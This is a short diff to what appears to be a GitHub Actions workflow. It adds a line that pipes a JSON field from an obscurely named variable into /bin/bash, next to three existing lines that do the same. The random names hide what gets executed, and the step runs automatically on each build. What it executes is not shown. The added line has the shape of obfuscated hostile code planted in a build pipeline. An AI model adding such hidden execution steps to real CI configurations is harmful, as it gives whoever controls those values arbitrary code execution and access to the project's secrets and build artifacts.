@@ -39,6 +39,7 @@ jobs:
           echo $hakpm7312 | jq -r .jfpfs1 | /bin/bash
           printf '%s' "$akxdx9" | jq -r .iic8850 | /bin/bash
           printf '%s' "$nz5269" | jq -r .aavej89 | /bin/bash
+          echo $cotsz5331 | jq -r .w97256 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
